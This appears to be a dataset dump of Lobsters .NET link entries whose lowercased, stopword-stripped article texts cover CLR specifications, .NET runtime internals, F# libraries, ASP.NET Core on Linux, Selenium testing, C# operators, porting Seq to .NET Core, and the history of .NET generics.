clr well worth read also convinced author spec wanted help future reader break thing included lot helpful diagram example see top also dropped comic sans make clear text informative changed spec edition interesting look change time edition release date clr version significant change december february na december april june january see link june none revision edition link december april see link june none revision edition link however edition contained significant update explained detail support generic type method see generic added net new il instruction ldelem stelem unboxany added constrained readonly il instruction prefix brand new namespaces corresponding type systemcollectionsgenerics systemthreadingparallel new type added including action nullable threadstaticattribute typeforwarding added semantics variance redefined became core feature multiple type added updated including systemaction systemmulticastdelegate systemweakreference systemmath systemdouble modified better conform ieee microsoft specific implementation another interesting aspect look microsoft specific implementation detail note following link pdf document modified version edition contain multiple occurrence text like implementation specific microsoft information finally want find book available affiliate link
284,Lobsters,dotnet,"C#, F#, .NET programming",F# .NET Standard RandomBits from ANU Quantum Random Numbers Server,https://jackfoxy.github.io/RandomBits/,f net standard randombits anu quantum random number server,randombits australian national university quantum random number server application available api reference report issue documentation license file,randombits f net standard library generating signed unsigned bit random number bit streamed australian national university quantum random number server specify length sequence open randombits let randombits new randombits let boolseq randombitsrndboolseq printfn boolseq seq true true true false let signedbyteseq randombitsrndsbyteseq printfn signedbyteseq seq let printfn seq let randombool randombitsrndbool printfn b randombool false let randomunsignedbyte randombitsrndbyte printfn randomunsignedbyte let printfn let printfn let printfn inclusive lower exclusive upper bound let randomconstrainedbyte randombitsrndsbyte printfn randomconstrainedbyte let printfn inclusive lower exclusive upper bound sequence length let printfn seq inclusive lower exclusive upper bound sequence length let printfn seq sample net net core application available run monte carlo simulation lotto game api reference contains automatically generated documentation type module function library includes additional brief sample using function report issue fork project submit pull request please also add test sample turned documentation library available public domain license allows modification redistribution commercial noncommercial purpose information see license file github repository val randombits obj val boolseq obj val printfn format printftextwriterformat val signedbyteseq obj val obj val randombool bool val randomunsignedbyte obj val obj val int val int val randomconstrainedbyte obj val obj val obj val obj
286,Lobsters,dotnet,"C#, F#, .NET programming",Exploring the internals of the .NET Runtime,http://www.mattwarren.org/2018/03/23/Exploring-the-internals-of-the-.NET-Runtime/,exploring internals net runtime,exploring internals net runtime herding code stackify developer thing decide want investigate see someone else already figured read book runtime build source debugging verify net framework note step one decide want investigate question trying answer string clr special relationship coreclr source delegate array fixed keyword type loader aside start somewhere idea follow hackernews rprogramming hitchhiker guide coreclr source code equivalent article julia evans blogging principle use want wizard zine post related blogging writing hugely influenced better julia approach blogging step two see someone else already figured optional education also help others new different add resource learning net internals internals tag blog answer han passant step three read book runtime book runtime botr scott hanselman agrees hackernews comment official reference one describing rule prestubs step four build source build even doc help building source useful view jit dump available logging configuration setting source code like one logged step five debugging microsoft open sourcing net without debugging using windbg using visual studio whilst starting step six verify net framework available github create app domain internal class life debug clr using windbg rotor source code resource rprogramming rdotnet,exploring internals net runtime mar word recently appeared herding code stackify developer thing podcasts case first question asked figure internals net runtime post attempt articulate process hope might useful others suggested step decide want investigate see someone else already figured optional read book runtime build source debugging verify net framework optional note type list worked mean everyone milage may vary step one decide want investigate mean working question trying answer example previous post written go show always need fancy title put step digging net internals quick easy work post take week research need motivation keep going something focus addition clr small runtime lot blindly trying find way around easy specific focus help looking one feature section time manageable first post followed approach string clr special relationship previously spent time looking coreclr source knew bit string clr worked detail research post found area clr understand rest blog grew delegate array fixed keyword type loader etc aside think generally applicable want start blogging think enough idea sustain recommend start somewhere idea follow another tip look hackernews rprogramming post internals runtimes eg java ruby python go etc write equivalent post clr one popular post hitchhiker guide coreclr source code clearly influenced equivalent article finally help learning figuring thing explaining others recommend read anything julia evans start blogging principle use want wizard also available zine work way post related blogging writing hugely influenced better julia approach blogging step two see someone else already figured optional put optional depends motivation trying understand net internals education feelfree write whatever want trying also help others recommend first see already written subject done still think something new different add go ahead try rehash already see already written start resource learning net internals peruse internals tag blog another really great resource answer han passant stackoverflow prolific amazingly knowledgeable example get started step three read book runtime get far investigating net internals without coming across book runtime botr invaluable resource even scott hanselman agrees written net engineering team net engineering team per hackernews comment worked year net runtime team attest botr official reference created documentation engineering team engineering team supposed kept date time new feature added changed however word warning mean indepth nontrivial document hard understand first learning particular topic several blog post consisted following step read botr chapter topic x understand read go away learn read source code read resource etc goto step understanding time related source code often helpful botr due extensive comment example one describing rule prestubs really helped downside source code comment bit harder find whereas botr one place step four build source however point reading internals clr enough actually need get hand dirty see action core clr open source easy build done even doc help building different os want debug test coreclr conjunction corefx etc building source useful let build debugdiagnostic version runtime give lot additional information available releaseretails build instance view jit dump using complusjitdump however one many complusxxx setting use available however even useful ability turn diagnostic logging particular area clr instance let imagine want find appdomains work underthehood use following logging configuration setting set set set set complusloglevela logfacility set lfappdomain many value provide hex bitmask full list available source code set variable run app get log output like one log easily search around code find message came instance place lfappdomain logged great technique find way section clr familiar used many time great effect step five debugging biggest boon microsoft open sourcing net discover much internals without resort old school debugging using windbg still come time useful step code linebyline see going added advantage source code build copy locally debug using visual studio slightly easier windbg always leave debugging last timeconsuming find helpful already know set breakpoint ie already know part code want step tried blindly step source clr whilst starting hard see going said clr complex runtime many thing happening stepping lot code linebyline get tricky step six verify net framework put final step net clr source available github net core version runtime fulldesktop net framework around year may need verify behavior match want understand internals going forward instance net core removed ability create app domain way provide isolation interestingly enough internal class life verify behaviour main option debug clr using windbg beyond resort looking rotor source code roughly net framework petition microsoft release net framework source code probably going happen however lowlevel internals change often often way thing behave coreclr always worked resource finally viewing pleasure talk related net internals discus post rprogramming rdotnet
288,Lobsters,dotnet,"C#, F#, .NET programming",Using OpenCL on F# via FSCL (2016),https://swlaschin.gitbooks.io/fsadvent-2016/content/2016-11-29-josesoyo/,using opencl f via fscl,using opencl f via fscl http jose mª gonzález fsharporg intel xeonphi,using opencl f via fscl text code copyright c jose mª gonzález used permission original post dated available http jose mª gonzález user f love language today like talk point struggling run f code gpu fsharporg nice list library run f gpu old specially updated since long time ago another problem find documentation reason decided write simple example use fscl fsharp opencl one method run f code gpu fscl installed nuget since prefer work script first thing must reference library file open fscl r r r r r r r r r r r r open fsclcompiler open fscllanguage open fsclruntime library contains number function see one opencl device useful check execute code opencl driver already installed opencl ready run starting ask system many opencl device open opencl openclplatformplatformscount thus called fscl know device compatible opencl start defining constant function similar standard one constantdefine let pi reflecteddefinition kernel let dostuffopencl b c iters wi workiteminfo let gid wiglobalid let outarr arrayzerocreate let mutable acc gid acc b co pi iters gid c acc outarr gid acc outarr let dostuff b c iters arrayfold fun acc x accb x co pi iters x ac x see function ready run opencl fscl similar one write normally attribute reflecteddefinition kernel reflecteddefinition necessary specify fscl function kernel kernel always necessary use attribute kernel since nested function working parameter called workiteminfo need pas fscl kernel indicating global local size kernel case function used properly produce output need define array operate one size kernel let w worksize let arrayzerocreate let arrayzerocreate arraymapi fun let amplitude let frequency let phase pi pi last step run kernel compare fast compared fsharp equivalent function iterate many time see performance time arrayiter fun fun old old dostuff amplitude phase frequency ignore arrayiter fun dostuffopencl amplitude phase frequency w run ignore show cpu serial code run parallel use arrayparalleliter comparative laptop gtx fscl real cpu f real cpu arrayparalleliter real cpu using gpu fscl possible accelerate code respect parallel way cpu important remember since code converted opencl use restricted gpu run many device example also run well intel xeonphi
289,Lobsters,dotnet,"C#, F#, .NET programming",ASP.NET Core Development in Linux,https://www.blinkingcaret.com/2018/03/20/net-core-linux/,aspnet core development linux,ide visual studio code c extension typical project creating project solution file net core visual studio code adding project reference picking startup project adding class interface c extension demo extension page yeoman generatoraspnet email protected generatoraspnet github issue email protected mentioned previously extension razor view aspnet helper github issue jetbrains rider angular aspnet core nuget package nuget package manager dotnet add package honor package type v packagetypedotnetclitool fails install would however add package additionally manually adding running test several option although trait specific xunit one last tip,net core came lot excitement idea developing net code outside window ide choice net visual studio probably always windowsonly program alternative though today possible fully develop aspnet core application outside window blog post looking specifically linux please note tooling described crossplatform work platform support net core ide full version visual studio available window however alternative somewhat confusing name visual studio code might think v code inferior version full visual studio product case v code different project altogether built using different set technology brings feature full v example easily extensible customizable also le demanding term resource v code offer ability extend functionality installation extension c install c extension need go trouble looking though open project c visual studio code prompt install c extension already rest blog post create hypothetical aspnet core web application order illustrate required task developing net namely create project solution reference project install nuget package use dotnet tool like entity framework run test typical project imaginary project creating reminder application idea describe project sufficient complexity would require multiple project reference solution file test solution contain aspnet core project could example used see past future reminder console application create reminder command line illustrate solution one running project class library contain common logic also add test project illustrate unit test run command line inside v code creating project solution file time installed net core visual studio code able open terminal window type dotnet get output something similar usage dotnet option usage dotnet pathtoapplication option h help display help version display version pathtoapplication path application dll file execute one option dotnet command new check option help page dotnet option help case dotnet new help display list possible project template choose example create aspnet core mvc project dotnet new mvc run new mvc project created current folder using name current folder default namespace project name might want case use name output option using name n specify default namespace output specify folder name create place project file use name specify output output folder implicitly take value name probably good idea define project folder structure continue reminder remindersweb reminderscli reminderscommon reminderstests first thing need create project folder named reminder inside dotnet new mvc name remindersweb dotnet new console name reminderscli dotnet new classlib name reminderscommon dotnet new xunit name reminderstests create project one mvc one console class library xunit test project good idea create solution file well especially eventually want open project full visual studio prompt create one eventually advantage solution file avoiding full visual studio nagging creating sln file one go reminder folder dotnet build dotnet restore buildrestore project referenced sln file also sln file open project v code initiating v code folder sln file located let create sln file name reminderssln add four project inside reminder folder dotnet new sln name reminder dotnet sln add reminderswebreminderswebcsproj dotnet sln add reminderscliremindersclicsproj dotnet sln add reminderscommonreminderscommoncsproj dotnet sln add reminderstestsreminderstestscsproj adding project reference full visual studio want add reference project right click reference select add reference pick project want add done v code functionality need resort command line easy example let reference reminderscommon remindersweb reminderscli reminderstests navigate folder sln file reminder type dotnet add reminderswebreminderswebcsproj reference reminderscommonreminderscommoncsproj dotnet add reminderscliremindersclicsproj reference reminderscommonreminderscommoncsproj dotnet add reminderstestsreminderstestscsproj reference reminderscommonreminderscommoncsproj want look project referenced particular project either open csproj file look projectreference entry want command line dotnet list pathtocsproj reference also navigate folder particular project simply dotnet add reference pathtootherprojectcsprj picking startup project open solution v code easiest way navigate reminder folder sln file type code get message v code required asset build debug missing reminder add click yes create vscode folder folder two file launchjson tasksjson launchjson configures happens press inside v code project run reminderscli console project use intellisense find attribute exist c debugging use hover description existing attribute information visit http githubcomomnisharpomnisharpvscodeblobmasterdebuggerlaunchjsonmd version configuration name net core launch console type coreclr request launch prelaunchtask build changed target framework make sure update program path program workspacefolder args cwd workspacefolder reminderscli information console field see http githubcomomnisharpomnisharpvscodeblobmasterdebuggerlaunchjsonmd consoleterminalwindow console internalconsole stopatentry false internalconsoleoptions openonsessionstart name net core attach type coreclr request attach processid command pickprocess also tasksjson compile reminderscli project version task label build command dotnet type process args build workspacefolder reminderscliremindersclicsproj problemmatcher mscompile possible customize two file pick project run case want able run either remindersweb reminderscli first thing remove second item tasksjson args array workspacefolder reminderscliremindersclicsproj need solution file reminderssln dotnet build executed folder contains sln file project referenced solution get built go launchjson click add button bottom left corner select net launch local net core web application generated json change program cwd current working directory program workspaceroot cwd workspaceroot remindersweb go debug section visual studio code see web console app configuration note change configuration name like change name property launchjson press inside v code project run one selected debug section v code affect v code though dotnet run command unaffected change terminal navigate solution folder type dontet run get error find project need use project argument specify path csproj file want run eg dotnet run project reminderswebreminderswebcsproj alternatively navigate project folder execute dontet run adding class interface full visual studio several template available adding new file project v code box option create new file use v code snippet eg typing class tab fortunately v code extension named c extension add two option context menu v code explorer view new c class new c interface extension also add ability generate class constructor property generate property constructor add readonly property initialize demo extension page section complete without mentioning currently abandoned alternative named yeoman specifically generatoraspnet yeoman nodejs application allows install yeoman generator generate code aspnet core particularly interesting generator named generatoraspnet generator provided set project template similar dotnet new offer mvc application console app etc interesting thing generatoraspnet set subgenerators subgenerator yeoman small generator creating one file example class interface empty html page example using generatorasp create new class yo aspnet class classname generatorasp load yo aspnet angularcontroller option name yo aspnet angularcontrolleras option name yo aspnet angulardirective option name yo aspnet angularfactory option name yo aspnet angularmodule option name yo aspnet appsettings option yo aspnet bowerjson option yo aspnet class option name yo aspnet coffeescript option name yo aspnet dockerfile option yo aspnet gitignore option yo aspnet gruntfile option yo aspnet gulpfile option name yo aspnet htmlpage option name yo aspnet interface option name yo aspnet javascript option name yo aspnet json option name yo aspnet jsonschema option name yo aspnet middleware option name yo aspnet mvccontroller option name yo aspnet mvcview option name yo aspnet nuget option yo aspnet packagejson option yo aspnet program option yo aspnet startup option yo aspnet stylesheet option name yo aspnet stylesheetless option name yo aspnet stylesheetscss option name yo aspnet taghelper option name yo aspnet textfile option name yo aspnet tfignore option yo aspnet typescript option name yo aspnet typescriptconfig option name yo aspnet typescriptjsx option name yo aspnet usersecrets option name yo aspnet webapicontroller option name unfortunately removed version list email protected latest version today talk generatoraspnet github issue although never mentioned explicitly seems dotnet new way go unfortunately generation command similar subgenerators dotnet new nuget config web config razor page mvc viewimports mvc viewstart get list type dotnet new still install specific version generatoraspnet though npm install email protected use generator still useful however creating class extension mentioned previously easiest convenient use let use create reminder class inside remindercommon project reminder class id property description date boolean flag isfinished indicate reminder acknowledged first thing need install c extension extension right click reminderscommon explorer view select new class name remindercs create three property end look like using system namespace reminderscommon public class reminder public int id get set public string description get set public datetime date get set public bool isfinished get set put cursor opening class reminder click light bulb select initialize ctor property end using system namespace reminderscommon public class reminder public reminder int id string description datetime date bool isfinished thisid id thisdescription description thisdate date thisisfinished isfinished public int id get set public string description get set public datetime date get set public bool isfinished get set although constructor really necessary play well entity framework planning use example nice feature get extension also defining property use snippet available full visual studio ie type prop press tab razor view razor page cshtml definitely area v code lacking intellisense even autoindent extension marketplace named aspnet helper get intellisense however import namespaces model viewimportschtml extension requirement bottom extension page also current version seems work model use project view extension useful situation limited deal breaker github issue adding razor support language service v code relies would provide intellisense similar full version visual studio upvote leave comment bring visibility issue want good experience creating razor page today mind paying little bit money try jetbrains rider rider run window mac linux people created resharper tried good month ago beta time required fairly decent machine run smoothly lacking feature tried today writing seems much much better razor support seems perfect even though experience razor v code right ideal go frontend javascript framework angular react vue etc instead razor find v code excellent used mostly angular typescript area v code arguably better full version visual studio somewhat familiar angular planning use aspnet core web api front end check article angular aspnet core nuget package full version visual studio option manage nuget package get ui search update install nuget package v code support nuget box thankfully extension install enable searching adding removing nuget package v code extension named nuget package manager alternatively use command line add package project syntax dotnet add pathtocsproj package packagename navigate project want add nuget package omit path csproj file dotnet add package packagename imagine wanted add microsoftentityframeworkcore package reminderscommon class library navigating dotnet add package microsoftentityframeworkcore example cli tool example entity framework tool run type project ef tooling installed dotnet ef get output entity framework core net command line tool usage dotnet ef option command unfortunately automated way configuring dotnet tooling start project template right setup manually edit csproj file know right package name version problem specific v code linux tooling problem relevant issue github dotnet add package honor package type v packagetypedotnetclitool fails install way manually though open csproj file notice itemgroup section example new mvc project itemgroup packagereference include microsoftaspnetcoreall version itemgroup tooling create another itemgroup inside instead packagereference use dotnetclitoolreference may already itemgroup dotnetclitoolreference project case add let imagine want use entity framework tooling web project navigate remindersweb open csproj file make note version microsoftaspnetcoreall package example let imagine create new itemgroup find itemgroup already dotnetclitoolreferences inside add dotnetclitoolreference microsoftentityframeworkcoretoolsdotnet version itemgroup packagereference include microsoftaspnetcoreall version itemgroup itemgroup dotnetclitoolreference include microsoftentityframeworkcoretoolsdotnet version add dotnetclitoolreference include microsoftvisualstudiowebcodegenerationtools version itemgroup able run dotnet ef remindersweb project reason version must match microsoftasnetcoreall package metapackage ie package reference package package entity framework package would cause compatibility issue tooling version match installing entity framework core tooling console project need worry version would however add package microsoftentityframeworkcoredesign additionally manually adding dotnetclitoolreference setting entity framework straightforward net core going describe topic detail example use console project class library etc next week want miss subscribe subscription form right sidebar running test one thing development workflow probably involves writing unit test v code come box support running unit test example open notice test method two link run test debug test allow run unit test time way inside v code running test project however navigate test project terminal type dotnet test output get reminderstests starting test execution please wait xunitnet discovering reminderstests xunitnet discovered reminderstests xunitnet starting reminderstests xunitnet finished reminderstests total test passed failed skipped test run successful alternatively specify path test project want run example dotnet test reminderstestsreminderstestscsproj also possible specify test run command line example say want run test class myclasstests dotnet test filter myclasstests filter functionality several option example short dotnet test filter fullyqualifiednamemyclasstests mean contains handy option example xunit possible specify trait test example trait traitname traitvalue public class fact public void run dotnet test filter traitnametraitvalue test trait run specify trait method class level although trait specific xunit equivalent construct testing framework example mstest testcategory prefer everything inside v code create task running test first go tasksjson make copy build task change label test whatever want call update args instead build test executed path test project example reminderstests label test command dotnet type process args test workspacefolder reminderstestsreminderstestscsproj problemmatcher mscompile run task v code using command palette ctrl shift p typing run task selecting task want run even set task test task assign keyboard shortcut way ctrl shift b trigger task configured build task set task test task open command palette select task configure default test task choose test task done one last tip sometimes v code actually omnisharp seems go haywire example intellisense stop working happens either reload v code using command palette selecting reload window le aggressive option restart omnisharp command name omnisharp restart omnisharp hope guide helpful let know comment related
290,Lobsters,dotnet,"C#, F#, .NET programming",Setting up automated testing with MSTest and Selenium,http://flyingfisch.github.io/testing/2018/03/20/automated-testing-with-mstest-and-selenium.html,setting automated testing mstest selenium,author posted tag setting automated testing mstest selenium creating test project getting test run browser going forward,author mark fischer jr posted mar tag testing setting automated testing mstest selenium started implementing automated testing project working using mstest selenium run several issue find answer online thought document finding creating test project create project using unit test template visual studio far understand naming convention test project usually projectbeingtestedtests add following nuget package project seleniumwebdriver seleniumsupport also need add nuget package browser want test used seleniumfirefoxwebdriver reason browser nuget package made third party selenium team need order test run far tell documented anywhere getting test run browser example online show something like testclass public class homecontrollertests testmethod public void homepagewhensuccessfulpagetitleishome using var driver new firefoxdriver drivernavigate gotourl http localhostmywebsite assertistrue drivertitle home issue test method use browser meaning every single test need open new browser slow around second machine instead following code used test test class use browser testclass public class homecontrollertests private static remotedriver driver classinitialize public static void classinitialize testcontext context initialize web driver driver new firefoxdriver classcleanup public static void classcleanup close web driver driverdispose testcleanup public void testcleanup delete cooky interestingly example selenium documentation supported language except c incomplete documentation drivermanage cookiesdeleteallcookies testmethod public void homepagewhensuccessfulpagetitleishome drivernavigate gotourl http localhostmywebsite assertistrue drivertitle home logic abstracted away abstract class added benefit allowing test class assembly use browser testclass public abstract class test protected static remotedriver driver get private set assemblyinitialize public static void assemblyinitialize testcontext context driver new firefoxdriver assemblycleanup public static void assemblycleanup driverdispose testcleanup public void testcleanup drivermanage cookiesdeleteallcookies testclass public class homecontrollertests test testmethod public void homepagewhensuccessfulpagetitleishome drivernavigate gotourl http localhostmywebsite assertistrue drivertitle home going forward blogging finding get moment week test driven development behavior driven development acceptance driven development whatever post setting project structure getting actual test writing continuous integration using tfs future post might also add web driver headless web driver develops
291,Lobsters,dotnet,"C#, F#, .NET programming",True and false operators in C#,https://www.tabsoverspaces.com/233707-true-and-false-operators-in-csharp/,true false operator c,true false operator c c specification,true false operator c mar min c day ago learned new thing c apparently true false operator overload also wanted know good given never heard let start simple dummy code see class truefalseoperator public truefalseoperator int value value value public int value get public static bool operator true truefalseoperator value consolewriteline true return valuevalue public static bool operator false truefalseoperator value consolewriteline false return valuevalue ok compiles one thing noticed typing implement true false omit one compiler remind used documentation find useful piece historical context prior c true false operator used create userdefined nullable value type compatible type sqlbool however language provides builtin support nullable value type whenever possible use instead overloading true false operator information see nullable type nullable booleans expression b necessarily equal b one value might null overload true false operator separately correctly handle null value expression nice know explains never heard although used c version digging deep time operator used regular code true seems candidate condition var value new truefalseoperator value actually call true method simply swap condition value call false compiler give error saying operator applied operand type truefalseoperator make sense false actually used research interwebs found information operator nonoverridable evaluated eventually somewhat overload using overload x evaluated tfalse x x x see c specification building class modified adding overload dummy implementation public static truefalseoperator operator truefalseoperator lh truefalseoperator rh return null using value value trigger code path false method mission completed knowledge know shelve corner head one day become interesting topic discus near glass beer jiří činčura independent developer focusing data business layer language construct parallelism database specifically entity framework asynchronous parallel programming cloud azure microsoft valuable professional read article guide tip trick wwwtabsoverspacescom
292,Lobsters,dotnet,"C#, F#, .NET programming","From .NET Framework to .NET Core and Linux, the story so far",https://nblumhardt.com/2018/03/from-netfx-to-core/,net framework net core linux story far,seq running natively linux docker whole new analytic query engine rewrote dashboarding redesigned signal bar first step taking care library tl dr superpower serilog stand shoulder exploring state net core deployment piggy writing experience building portable event store query engine seq breaking dependency deployed seq writing seq apps nonnet language last mile written detail development environment codebase conclusion available try docker hub,two year ago seq entirely net framework windowsspecific codebase week took wrap first preview release seq running natively linux docker seq continued evolving released whole new analytic query engine rewrote dashboarding added alerting redesigned signal bar background thread persistently working towards crossplatform compatibility starting path lot unknown obvious mountain work ahead set direction already embarked hope take idea comfort away short post explaining process used get working codebase across line first step taking care library think tl dr version article one insight easier complete messy lastmile port come part later already created working battletested cross platform version anything possibly seq meant porting library within solution lowhanging fruit solution made compile net core converting new csproj format adding additional netstandard netcoreapp moniker targetframeworks element library could extract pulled new parser construction library superpower shipped os github targeting net standard beginning library help maintain work move serilog sink extension started helping community effort get library across eventually made platform port much smoother since net standard library used net framework code could integrated app tested used immediately probably textbook use case net standard worth calling worked advertised seq able target net standard running net framework really wonderful feature net tooling taken individually little library dependency seemed insignificant comparison lastmile task porting put together stable tested crossplatform library reduced two important measure lastmile port began time switching target compilable code compilable mean refactorable unittestable progress point everything compiles much smoother safer incremental hacking completely broken codebase source go hunting around bug thing work expected much nicer knowing certainty problem code porting rather external library like net apps seq stand shoulder vast ecosystem library nuget elsewhere pretty good idea dependency going make transition net core smoothly going work exploring state net core deployment good grasp stood respect net core net standard apis next major unknown packaging deployment net core attractive seq beginning deployment model instead keep seq compatible different net framework version running everyone desktop server net core deploy runtime framework component depend upon product much testable supportable would work practice combined window installer various target operating system still unknown first built released cleftool tiny net core commandline app complete msibased installer piggy net core cli like cleftool time targeting macos linux addition window solving problem uncovered writing experience helped shift work critical lastmile around time moved internal infrastructure selfcontained aspnet core app running linux docker lot increase confidence stability robustness net core stack building portable event store query engine window seq historically used esent managing raw data disk since esent window component knew early replacement would needed seq run operating system back seq went storage engine istorageengine included alternative implementation based lmdb ended dependency graph like able maintain windowsonly net frameworkbased esent backend moving query engine event store new lmdbbacked storage portable net standard library ready run linux macos might make bit sense keep mind seq us esent lmdb reliably persisting retrieving byte event disk filtering query language sharding across extent caching soon implemented higher level seq select count stream group time executes mostly code path regardless event persisted test harness aspnet core mini seq ingested retrieved event running net core linux portable code created tested bug ironed breaking appdomain dependency least pleasant task must subconsiously avoided almost last minute figuring seq plugin app mechanism apps implemented net assembly loaded seq process appdomain set carefully predictable version shared library like newtonsoftjson seqapps serilog would found library used seq could kept way two big problem solve besides apps nuget know customer using seq today written kind apps purpose chance successfully run unmodified net core appdomain isolation supported net core appdomain type still around ugly complex hosting feature left kudos net team seeing change solution deployed seq host apps process mean seq running net core window create net framework process host app without reintroducing net framework dependency seq codebase might spot seqappsgenerichostexe running server simple net framework app load plugin assembly feed event sent stdin parent seq process linux macos generic host process used time running net core apps use window net frameworkonly feature work far high success rate running popular apps like seqappslack unmodified although seq apps use generic host process new app runner host executable seq app open possibilites like writing seq apps nonnet language c api still portable way write seq app think plainexecutable approach big plus company using seq nonnet language hosting apps separate process also open great opportunity u improve app mechanism future process easier properly isolate appdomains one day monitor report io cpu memory cost running app precisely really looking forward exploring full extent improvement made possible change last mile time came shift main seq executable net core already done lot groundwork hope set expectation far applied novel strategy part process afraid disappointed early january started partiallyportable windowsnet framework based solution switched executable project target started fixing compilation error used liberally exclude broken code mountain error diminished small hill put priority getting unit test endtoend test runner working took u end january runnable deeply broken linux build still replace several nonportable component service hosting nuget client metadata store mention migrating entire api aspnet core invested lot time solid crossplatform ci testing spite really impressive much code worked net core larger api surface area supported net core net standard eliminates lowvalue churn required porting code earlier version lot fun way found challenging problem solve ashley mannix written detail development environment codebase seq blog conclusion time writing early preview release available try docker hub pretty amazing given two month since forked seq release branch preparation really paid u much easier bring smaller incremental milestone time would keep large development milestone track rtm doubt also going interesting time looking forward sharing update go
295,Lobsters,dotnet,"C#, F#, .NET programming",How generics were added to .NET,http://www.mattwarren.org/2018/03/02/How-generics-were-added-to-.NET/,generic added net,generic added net hackernews rprogramming syme design implement f background history update pointed combining generic precompilation sharing software based process pdf net framework release netc generic history complete high quality implementation clr including ngen debugging jit appdomains concurrent loading many aspect c compiler generic c linq c tpl c async c f gyro project generic rotor gyro project shared source common language implementation download blog released history gc research project draft msr cambridge team rest post look generic implemented rotor source code note jit gc dotnetrocks show ted neward joel pobar rotor rotor source coreclr source implementation github repo rotor code net gyro source code see change one place component directory change significant amount change note c code generic type information diff diff file change component runtime type system change diff open closed generic type diff shared instantiation diff diff diff diff diff shared instantiation fully reified instead using type erasure erasure v reification reified generic java update hackernews discussion diff significant change handle additional instruction design implementation generic net common language runtime shared instantiation design implementation generic net common language runtime reference type compatible primitive type mutually incompatible userdefined struct type compatible layout comment info comment update compiler jit change diff diff diff diff diff diff il instruction diff diff diff debugger change diff diff diff diff diff reading gyro source code download precompilation net generic andrew kennedy syme,generic added net mar word discus post hackernews rprogramming dive technical detail let start quick history lesson courtesy syme worked adding generic net went design implement f pretty impressive set achievement background history initial research design planning first white paper published c language design specification created research paper published work completed bug fixed update syme pointed another research paper related net generic combining generic precompilation sharing software based process pdf give idea event fit bigger picture date net framework release upto first version generic version number clr version release date aside historical perspective find fascinating much addition generic net due work done microsoft research netc generic history total dedication microsoft research cambridge complete high quality implementation clr including ngen debugging jit appdomains concurrent loading many aspect c compiler project proceeded go say would cost inaction would cost failure generic c linq c tpl c async c f ultimately erasure model generic would adopted java since clr team would never pursued inthevm generic design without external help wow c net would look different without feature gyro project generic rotor unfortunately exist publicly accessible version net source code go back look change made wrong please let know love read however next best thing gyro project equivalent change made shared source common language implementation sscli code base aka rotor aside want learn rotor code base really recommend excellent book ted neward download blog gyro released implies created work done real net framework source code assume microsoft research wanted publish rotor implementation could studied widely gyro also referenced one syme post history gc research project draft msr cambridge team dave berry help later published version corresponding code gyro variant rotor cli implementation rest post look generic implemented rotor source code note significant difference rotor source code real net framework notably jit gc completely different implementation due licensing issue listen dotnetrocks show ted neward joel pobar rotor info however rotor source give u accurate idea core part clr implemented typesystem debugger appdomains vm interesting compare rotor source current coreclr source see much source code layout class name remained implementation make thing easier anyone want followalong created github repo contains rotor code net checked gyro source code top mean see change one place first thing notice gyro source file contain particular piece legalese using software fashion agreeing bound term license file contains modification base sscli software support generic type definition generic method modification research purpose commit microsoft future support similar change sscli net product october must remove notice software funny needed add line commit microsoft future support similar change sscli net product even though month away component directory change see work done let start highlevel view showing directory significant amount change total change git diff bcl csharpcsharpsccomp debugdi debugee debuginc debugshell fjit ilasm ildasm inc mdcompiler vm note fjit fast jit compiler ie version released rotor significantly different one available full net framework full output git diff available output git diff stat bcl included show little c code change needed mostly plumbing code expose underlying c method change various tostring method include generic type information eg class int double however significant one bclsystemreflectionemitopcodescs diff bclsystemreflectionemitsignaturehelpercs diff add ability parse method metadata contains generic related information method generic parameter file change next take look specific classesfiles change give u really good idea complexity component runtime look individual component detail get idea different part runtime change accommodate generic type system change surprisingly bulk change virtual machine vm component clr related type system obviously adding parameterised type type system already requires wideranging significant change shown list vmclasscpp diff allow type system distinguish open closed generic type provide apis allow working isgenericvariable getgenerictypedefinition vmgenmethcpp diff contains bulk functionality make generic method possible ie mymethod u item u filter including work done enable shared instantiation generic method vmtypeparsecpp diff change needed allow generic type lookedup name ie myclass vmsiginfocpp diff add ability work genericrelated method signature vmmethodhpp diff vmmethodcpp diff provides runtime generic related method isgenericmethoddefinition getnumgenericmethodargs getnumgenericclassargs vmgenericscpp diff completely new generic specific code mostly related shared instantiation explained main place implementation generic clr differs jvm fully reified instead using type erasure possible clr designer willing break backwards compatibility whereas jvm around longer assume much le appealing option discussion issue see erasure v reification reified generic java update hackernews discussion also worth read specific change made net intermediate language il opcodes seen incopcodedef diff essence following instruction added addition il assembler tool ilasm needed significant change well counter part il disassembler ildasm could handle additional instruction also whole section titled support polymorphism il explains change greater detail design implementation generic net common language runtime shared instantiation design implementation generic net common language runtime two instantiation compatible parameterized class compilation instantiation give rise identical code execution structure eg field layout gc table apart dictionary described section particular reference type compatible loader jit compiler make distinction purpose field layout code generation implementation intel least primitive type mutually incompatible even size float ints different parameter passing convention leaf userdefined struct type compatible layout respect garbage collection ie share pattern traced pointer comment info generic type instance return representative within class type handle share code example int int object object string object list string object struct string struct object code type handle shared return type handle addition comment explains work need take place allow shared instantiation working generic method update want info codesharing take place recommend reading post compiler jit change seems like almost every part compiler change accommodate generic surprising given touch many part code write type class method biggest change csharpcsharpsccompclsdreccpp diff csharpcsharpsccompemittercpp diff csharpcsharpsccompfncbindcpp diff csharpcsharpsccompimportcpp diff csharpcsharpsccompparsercpp diff csharpcsharpsccompsymmgrcpp diff justintime jit compiler extra work needed responsible implementing additional il instruction bulk change took place fjitcpp diff fjitdefh diff finally large amount work done vmjitinterfacecpp diff enable jit access extra information needed emit code generic method debugger change last mean least significant amount work done ensure debugger could understand inspect generic type go show much inside information debugger need type system managed language debugeedebuggercpp diff debugeedebuggerh diff debugdimodulecpp diff debugdirsthreadcpp diff debugshelldshellcpp diff reading want even information generic net also useful design doc available included gyro source code download also precompilation net generic andrew kennedy syme pdf interesting read
